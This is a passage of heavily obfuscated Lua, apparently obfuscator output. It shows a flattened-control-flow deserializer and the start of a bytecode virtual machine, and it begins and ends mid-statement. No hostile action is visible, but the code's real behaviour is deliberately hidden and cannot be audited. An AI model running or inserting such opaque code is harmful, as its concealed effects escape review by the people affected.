a<=21 then if 21>a then bz=5205 else ca=470 end else if 23>a then cc=746 else ce=1816 end end end else if a<=27 then if a<=25 then if a<25 then cs=18568 else ct=2 end else if a<27 then cu=1 else cv=421 end end else if a<=29 then if 28==a then cw=0 else cx,cy=cw,cu end else if a<=30 then cz=(function(da,db,dc,dd)local de=0 while true do if 0==de then da(db(dd,dd,dc,dd),dc(db,da,db,dd),dc(dc,db,dc,dc),dd(db and da,dd,dc,dc))else break end de=de+1 end end)(function(da,db,dc,dd)local de=0 while true do if de<=2 then if de<=0 then if(cx>cv)then local cv=cw while true do cv=(cv+cu)if((cv<ct))then return db else break end end end else if 2~=de then cx=cx+cu else cy=((cy+cc)%cs)end end else if de<=3 then if(not(((cy%ce))~=by)or((cy%ce)>by))then local by=cw while true do by=by+cu if(by==cu or by<cu)then cy=(cy-ca)%bz else if not(not(by==ct))then return db(da(dc,da,da,((db and dc))),dc(db,db,da,((dc and dd))),dc(da,dd,da,dc),(da(dc,(dd and db),db and dc,da)and da((dc and dd),dc and da,dd,dc)))else break end end end else local by=cw while true do by=(by+cu)if not((by~=ct))then break else return da end end end else if de~=5 then return db else break end end end de=de+1 end end,function(by,bz,cc,ce)local cs=0 while true do if cs<=2 then if cs<=0 then if cx>bw then local bw=cw while true do bw=bw+cu if not(not(bw==ct))then break else return by end end end else if cs<2 then cx=(cx+cu)else cy=((((cy-bk))%bs))end end else if cs<=3 then if(((cy%bi)==bj)or((cy%bi)>bj))then local bi=cw while true do bi=(bi+cu)if((not(bi~=ct)or bi>ct))then if((bi<bh))then return cc else break end else cy=((cy*bg)%be)end end else local be=cw while true do be=((be+cu))if(be<ct)then return by(bz((ce and bz),(by and bz),(cc and by),by),((ce(bz,ce,bz,(cc and ce))and cc(cc,ce,cc,cc))),(cc(ce,by and ce,by,ce)and bz(by,by and by,cc,bz)),cc(cc,ce,((bz and ce)),cc))else break end end end else if cs<5 then return by(cc(cc,bz,(cc and by),ce),ce(cc,cc,ce,by),by(ce,ce,bz,by),bz(by,(by and by),cc,ce))else break end end end cs=cs+1 end end,function(be,bg,bi,bj)local bk=0 while true do if bk<=2 then if bk<=0 then if((cx>bf))then local bf=cw while true do bf=(bf+cu)if(bf<ct)then return bj else break end end end else if 2~=bk then cx=cx+cu else cy=(((cy+y)%x))end end else if bk<=3 then if(((cy%v)>w or not((cy%v)~=w)))then local v=cw while true do v=((v+cu))if((v<cu)or(v==cu))then cy=(((cy-ca)%s))else if not((v~=bh))then break else return bj end end end else local s=cw while true do s=((s+cu))if not((s~=ct))then break else return bi(be(bi,((be and bi)),bg,bj),(bj(bi,be,bg,bi)and bg(bj,bj and bi,bg,bi and bj)),bi(bg,bi,be,bi),bg(bg,bj,bg,bg))end end end else if bk>4 then break else return be(bi((bg and bj),bg,bg and be,(bj and bi)),bj(be,bi,bj,bi),bj((bj and bi),(bi and bi),bg,bi),be(bi,bj,bg,bj))end end end bk=bk+1 end end,function(s,v,w,x)local y=0 while true do if y<=2 then if y<=0 then if(cx>q)then local q=cw while true do q=q+cu if q<ct then return x else break end end end else if y>1 then cy=(((cy*p))%d)else cx=(cx+cu)end end else if y<=3 then if((cy%c)>b)then local b=cw while true do b=(b+cu)if((b<ct))then return s(w(x,s,s,(v and w)),s(s,w,v,(v and s))and x(v,x,x,v),v(s,x,s,(w and s)),w(s,w,s,w)and s(v,w,s,(s and x)))else break end end else local b=cw while true do b=b+cu if not(b~=ct)then break else return v end end end else if 5~=y then return x else break end end end y=y+1 end end)else if 32>a then return cy;else break end end end end end end a=a+1 end end)());else ck=function()local a,b,c,d,p,q,s=0 while true do if a<=3 then if a<=1 then if 0<a then if(b==0 and c==0)then return 0;end;else b,c=cf(),cf()end else if a<3 then d=1 else p=(cd(c,1,20)*(2^32))+b end end else if a<=5 then if a~=5 then q=cd(c,21,31)else s=(((-1)^cd(c,32)))end else if a<=6 then if(not(q~=0))then if(not(p~=0))then return(s*0);else q=1;d=0;end;elseif(q==2047)then if(not(p~=0))then return s*(1/0);else return(s*(0/0));end;end;else if a==7 then return s*2^(q-1023)*(d+(p/(2^52)))else break end end end end a=a+1 end end end else if bd<=29 then cl="\46"else if 31>bd then cm=function()local a,b,c=0 while true do if a<=1 then if 0<a then b,c=bu(b,cb),bu(c,cb);else b,c=h(bn,br,(br+2))end else if a<=2 then br=br+2;else if 3<a then break else return((bv(c,8))+b);end end end a=a+1 end end else cn=cf end end end else if bd<=33 then if 32==bd then co=function()local a,b,c,d,p=0 while true do if a<=2 then if a<=0 then b=g else if 2~=a then c=157 else d=0 end end else if a<=3 then p={}else if 5>a then while(d<8)do d=(d+1);while(d<707 and c%1622<811)do c=((c*35))local q=(d+c)if((c%16522)<8261)then c=((c*19))while(((d<828)and c%658<329))do c=(((c+60)))local q=d+c if(not(((c%18428))~=9214)or((c%18428))<9214)then c=(((c-50)))local q=10701 if not p[q]then p[q]=1;local q,s=cn(),g;if not(q~=0)then return g;end;b=j(bn,br,((br+q-1)));br=((br+q));return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1==s then while true do if 0<v then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif((c%4~=0))then c=(c-67)local q=33140 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1==s then while true do if not(v==1)then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end else c=(c*88)d=d+1 local q=92657 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s>1 then break else while true do if 1>v then return i(h(q))else break end v=(v+1)end end end s=s+1 end end);end end;d=((d+1));end elseif not((c%4==0))then c=(c-48)while((d<859)and c%1392<696)do c=(c*39)local q=((d+c))if(c%58)<29 then c=(((c+5)))local q=33930 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if v>0 then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif not(not(c%4~=0))then c=((c*56))local q=35370 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2~=s then while true do if(v>0)then break else return i(h(q))end v=(v+1)end else break end end s=s+1 end end);end else c=((c*9))d=(d+1)local q=96267 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2>s then while true do if not(1==v)then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end end;d=(d+1);end else c=((c-51))d=((d+1))while(d<663)and(((c%936)<468))do c=(((c*12)))local q=(d+c)if((c%18532)>=9266)then c=(c*71)local q=7037 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if(v>0)then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif not((c%4==0))then c=(c-18)local q=90882 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s>1 then break else while true do if not(1==v)then return i(h(q))else break end v=v+1 end end end s=s+1 end end);end else c=((c*35))d=(d+1)local q=41573 if not p[q]then p[q]=1;return z(b,cl,function(b)local p,q=0 while true do if p<=0 then q=0 else if 2~=p then while true do if q==0 then return i(h(b))else break end q=q+1 end else break end end p=p+1 end end);end end;d=d+1;end end;d=d+1;end c=((c-494))if((d>43))then break;end;end;else break end end end a=a+1 end end else cp=cf end else if bd<=34 then cq=function(...)local a=0 while true do if 0<a then break else return{...},n("\35",...)end a=a+1 end end else if 35==bd then cr=function()local a,b,c,d,p,q,s,v,w,x=0 while true do if a<=9 then if a<=4 then if a<=1 then if a==0 then b,c,d,p={},{},{},{}else q=m({[ch]=b,nil,[ci]=c,nil,[776]=p,[345]=bb,[536]=nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return j(bn,br,br);end,})end else if a<=2 then s={}else if a~=4 then v=490 else w=0 end end end else if a<=6 then if 6~=a then x={}else while w<3 do w=((w+1));while((w<481 and v%320<160))do v=((v*62))local d=w+v if(v%916)>458 then v=((v-88))while((w<318)and v%702<351)do v=(((v*8)))local d=(w+v)if((v%14064)>7032)then v=((v*81))local d=58084 if not x[d]then x[d]=1;s[cf()]=nil;end elseif(v%4~=0)then v=((v*37))local d=93269 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+10))w=((w+1))local d=78058 if not x[d]then x[d]=1;for d=1,cf()do local j=cg();if(not(not(j==3)))then s[d]=nil;elseif(not(not(j==2)))then s[d]=(not(not(cg()~=0)));elseif(((j==0)))then s[d]=ck();elseif(not(j~=1))then s[d]=co();end;end;q[cj]=s;end end;w=(w+1);end elseif not(not(((v%4))~=0))then v=((v*65))while w<615 and v%618<309 do v=((v-33))local d=w+v if((((v%15582))>7791))then v=((v*14))local d=31092 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not(v%4==0)then v=(((v+51)))local d=68285 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+53))w=(w+1)local d=64266 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=(w+1);end else v=((v+7))w=(w+1)while((w<127)and(v%1548<774))do v=((v-37))local d=((w+v))if(((v%19188)>9594))then v=((v*61))local d=73351 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not(v%4==0)then v=((v+25))local d=78934 if not x[d]then x[d]=1;s[cf()]=nil;end else v=(((v+42)))w=(w+1)local d=62692 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=((w+1));end end;w=(w+1);end v=((v*482))if w>56 then break;end;end;end else if a<=7 then v=90 else if 8==a then w=0 else x={}end end end end else if a<=14 then if a<=11 then if 10<a then q[481]=cg();else while w<7 do w=((w+1));while(w<545 and v%64<32)do v=(((v-34)))local d=((w+v))if(((v%7194))>3597)then v=(((v*53)))while w<362 and v%1902<951 do v=(v*76)local d=((w+v))if((v%106)<=53)then v=((v-63))local d=74304 if not x[d]then x[d]=1;end elseif not(v%4==0)then v=(((v-59)))local d=10782 if not x[d]then x[d]=1;end else v=(((v*11)))w=(w+1)local d=18141 if not x[d]then x[d]=1;end end;w=((w+1));end elseif v%4~=0 then v=(((v-76)))while((w<834)and((v%1524)<762))do v=(((v-79)))local d=w+v if(((v%14174))==7087 or((v%14174))<7087)then v=((v*18))local d=28537 if not x[d]then x[d]=1;end elseif not((v%4==0))then v=((v-51))local d=84104 if not x[d]then x[d]=1;end else v=((v*82))w=(w+1)local d=72580 if not x[d]then x[d]=1;end end;w=(w+1);end else v=((v-44))w=(w+1)while(w<537 and((v%638)<319))do v=(((v+29)))local d=((w+v))if((v%15550)<7775 or(v%15550)==7775)then v=((v*60))local d=65157 if not x[d]then x[d]=1;local d=1;local j=2;local p=3;local y=4;for y=1,cf()do local bb=cg();local be=cd(bb,d,d);if(not(not(be==0)))then local bb,be,bf=cd(bb,j,p),cd(bb,4,6),m({[250]=cm(),[131]=cm(),nil,nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return cd(bb,j,p);end,})if((bb==0)or(bb==d))then bf[834]=cf();if((not(not(bb==0))))then bf[784]=cf();end;elseif((((bb==j)or(not(bb~=p)))))then bf[834]=(cf()-(e));if((not(not(bb==p))))then bf[784]=cm();end;end;if(((not(cd(be,d,d)~=d))))then bf[131]=s[bf[131]];end;if((not(not(cd(be,j,j)==d))))then bf[834]=s[bf[834]];end;if(not(cd(be,p,p)~=d))then bf[784]=s[bf[784]];end;b[y]=bf;end;end;end elseif(v%4~=0)then v=((v-80))local b=17437 if not x[b]then x[b]=1;end else v=((v*81))w=((w+1))local b=53767 if not x[b]then x[b]=1;end end;w=(w+1);end end;w=(w+1);end v=((v+511))if((w>79))then break;end;end;end else if a<=12 then for b=1,cf()do c[b-1]=cr();end;else if 14>a then do for b=1,#q[ch]do local b=q[ch][b]local c,d,e=b[131],b[834],b[784]if not(not(not(bp(c)~=f)))then c=z(c,cl,function(j,p)local p,s=0 while true do if p<=0 then s=0 else if 2~=p then while true do if not(s==1)then return i(bu(h(j),cb))else break end s=(s+1)end else break end end p=p+1 end end)b[131]=c end if(bp(d)==f)then d=z(d,cl,function(c,j,j)local j,p=0 while true do if j<=0 then p=0 else if j~=2 then while true do if(p~=1)then return i(bu(h(c),cb))else break end p=(p+1)end else break end end j=j+1 end end)b[834]=d end if not(not((bp(e)==f)))then e=z(e,cl,function(c,d,d)local d,j=0 while true do if d<=0 then j=0 else if 2>d then while true do if j<1 then return i(bu(h(c),cb))else break end j=j+1 end else break end end d=d+1 end end)b[784]=e end;end;q[cj]=nil;end;else v=911 end end end else if a<=16 then if a~=16 then w=0 else x={}end else if a<=17 then while((w<4))do w=w+1;while(w<563 and v%692<346)do v=(v+57)local b=((w+v))if(((v%13094))<6547)then v=((v*43))while w<62 and(((v%1172))<586)do v=((v+4))local b=((w+v))if((v%8882))>4441 then v=((v+87))local b=10283 if not x[b]then x[b]=1;q[536]=function(...)local b,c,d,e,h=0 while true do if b<=0 then c,d,e,h=0 else if 1<b then break else while true do if(c==2 or c<2)then if(c==0 or c<0)then d=n(1,...)else if(c~=2)then e=({...})else do for d=0,#e do if not(not(bp(e[d])==bq))then for i,i in o,e[d]do if not(not(bp(i)==bp(g)))then t(bo,i)end end else t(bo,e[d])end end end end end else if(c==3 or c<3)then h=function(d)local i,j,p=0 while true do if i<=0 then j,p=0 else if i<2 then while true do if(j==1 or j<1)then if not(0~=j)then p=u(d)else for p=0,#bo do if ba(d,bo[p])then return bm(f);end end end else if j>2 then break else return false end end j=(j+1)end else break end end i=i+1 end end else if not(c==5)then for d=0,#e do if not(bp(e[d])~=bq)then return h(e[d])end end else break end end end c=c+1 end end end b=b+1 end end end elseif not((v%4)==0)then v=(((v-35)))local b=88762 if not x[b]then x[b]=1;return q end else v=(v*26)w=(w+1)local b=12905 if not x[b]then x[b]=1;return q end end;w=(w+1);end elseif not(not((v%4)~=0))then v=(v+48)while(w<990 and(v%1856)<928)do v=((v+6))local b=w+v if((v%6308)<3154)then v=(((v+80)))local b=65550 if not x[b]then x[b]=1;return q end elseif not((v%4)==0)then v=((v-85))local b=43125 if not x[b]then x[b]=1;return q end else v=(((v+21)))w=(w+1)local b=55087 if not x[b]then x[b]=1;return q end end;w=(w+1);end else v=(((v+1)))w=(w+1)while(((w<221)and(v%1396)<698))do v=((v-48))local b=(w+v)if((v%3284)>=1642)then v=((v-16))local b=80671 if not x[b]then x[b]=1;return q end elseif not(((v%4)==0))then v=((v+52))local b=53522 if not x[b]then x[b]=1;return q end else v=(((v-4)))w=(w+1)local b=5996 if not x[b]then x[b]=1;return q end end;w=((w+1));end end;w=(w+1);end v=(v-403)if((w>13))then break;end;end;else if a>18 then break else return q;end end end end end a=a+1 end end else break end end end end end end bd=bd+1 end local function a(b,c)local d if bp(l)==bq then d=l;else d=l(bl);end local e={}for f,h in o,d do if h~=b then e[f]=h else e[f]=c;end end if bc then return bc(bl,e)else l=e;return l;end end;local function b(...)local c=n(bl,...);local d=c[ci];local e=c[536];local f=c[ch];local h=n(2,...);local i=c[345];local j=n(3,...);local o=c[481];local c=c[776];local c=bt[ba(bx,i)];return function(...)local i,n,p,q,s,u,v,w=cq,1,-1,{},{...},(n("\35",...)-1),{},{};for x=0,u,1 do if(x>=o)then q[x-o]=s[x+1];else w[x]=s[x+1];end;end;local x,y,z,ba=(u-o+1),nil,nil,{};while true do y=f[n];z=y[250];if z<=192 then if z<=95 then if 47>=z then if 23>=z then if 11>=z then if z<=5 then if 2>=z then if 0>=z then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))elseif 1==z then w[y[131]]=w[y[834]][y[784]];else w[y[131]]=w[y[834]]+y[784];end;elseif z<=3 then if(y[131]<w[y[784]])then n=n+1;else n=y[834];end;elseif 4<z then local ba=y[131]local bb,bc=i(w[ba](r(w,ba+1,y[834])))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;else local ba;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))end;elseif z<=8 then if z<=6 then local ba;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))elseif z==7 then local ba;local bb;local bc;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];bc=y[131]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[784]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]]*y[784];n=n+1;y=f[n];w[y[131]]=w[y[834]]+w[y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]]+w[y[784]];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))end;elseif z<=9 then local ba;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=false;n=n+1;y=f[n];ba=y[131]w[ba](w[ba+1])elseif 10<z then local ba=y[131]local bb={w[ba](w[ba+1])};local bc=0;for bd=ba,y[784]do bc=bc+1;w[bd]=bb[bc];end else w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];if(w[y[131]]~=w[y[784]])then n=n+1;else n=y[834];end;end;elseif z<=17 then if z<=14 then if 12>=z then local ba=y[131]w[ba]=w[ba]()elseif 14~=z then w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];if(w[y[131]]~=w[y[784]])then n=n+1;else n=y[834];end;else local ba;w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba]()end;elseif 15>=z then local ba=y[131];local bb=y[784];local bc=ba+2;local bd={w[ba](w[ba+1],w[bc])};for be=1,bb do w[bc+be]=bd[be];end local ba=w[ba+3];if ba then w[bc]=ba;n=y[834];else n=n+1 end;elseif 16<z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;else w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];if(w[y[131]]~=y[784])then n=n+1;else n=y[834];end;end;elseif 20>=z then if 18>=z then w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];if(w[y[131]]~=w[y[784]])then n=n+1;else n=y[834];end;elseif 19<z then if(w[y[131]]~=y[784])then n=y[834];else n=n+1;end;else local ba;w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba]()end;elseif z<=21 then w[y[131]]=(w[y[834]]*y[784]);elseif z==22 then local ba;local bb;local bc;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];bc=y[834];bb=y[784];ba=k(w,g,bc,bb);w[y[131]]=ba;else w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];if w[y[131]]then n=n+1;else n=y[834];end;end;elseif 35>=z then if 29>=z then if 26>=z then if z<=24 then local ba;local bb;local bc;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];bc=y[131]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[784]do ba=ba+1;w[bd]=bb[ba];end elseif z==25 then do return w[y[131]]end else local ba;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))end;elseif 27>=z then local ba,bb=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba==0 then bb=nil else w={};end else if ba<=2 then for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;else if ba>3 then y=f[n];else n=n+1;end end end else if ba<=6 then if 5<ba then n=n+1;else w[y[131]]=y[834];end else if ba<=7 then y=f[n];else if 8==ba then w[y[131]]=h[y[834]];else n=n+1;end end end end else if ba<=14 then if ba<=11 then if ba==10 then y=f[n];else w[y[131]]=#w[y[834]];end else if ba<=12 then n=n+1;else if ba~=14 then y=f[n];else w[y[131]]=y[834];end end end else if ba<=17 then if ba<=15 then n=n+1;else if ba<17 then y=f[n];else bb=y[131];end end else if ba<=18 then w[bb]=w[bb]-w[bb+2];else if 20>ba then n=y[834];else break end end end end end ba=ba+1 end elseif 29>z then w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];if(w[y[131]]~=w[y[784]])then n=n+1;else n=y[834];end;else do return w[y[131]]end end;elseif z<=32 then if 30>=z then w[y[131]]=w[y[834]]+w[y[784]];elseif z~=32 then local ba;local bb;local bc;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];bc=y[131]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[784]do ba=ba+1;w[bd]=bb[ba];end else w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];if(w[y[131]]~=w[y[784]])then n=n+1;else n=y[834];end;end;elseif z<=33 then w[y[131]]=j[y[834]];elseif z==34 then local ba;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))else local ba;w[y[131]]=w[y[834]]%w[y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]]+y[784];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))end;elseif 41>=z then if 38>=z then if 36>=z then local ba;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];ba=y[131];do return w[ba](r(w,ba+1,y[834]))end;n=n+1;y=f[n];ba=y[131];do return r(w,ba,p)end;elseif z~=38 then local ba;local bb;local bc;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];bc=y[131]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[784]do ba=ba+1;w[bd]=bb[ba];end else w[y[131]][y[834]]=y[784];end;elseif z<=39 then local ba=y[131]w[ba](r(w,ba+1,y[834]))elseif 40==z then local ba=y[131];p=ba+x-1;for bb=ba,p do local ba=q[bb-ba];w[bb]=ba;end;else local ba;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))end;elseif z<=44 then if 42>=z then w[y[131]]=w[y[834]]-y[784];elseif z<44 then local ba=y[131]w[ba]=w[ba](w[ba+1])else w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];n=y[834];end;elseif z<=45 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];if w[y[131]]then n=n+1;else n=y[834];end;elseif z<47 then local ba;local bb;local 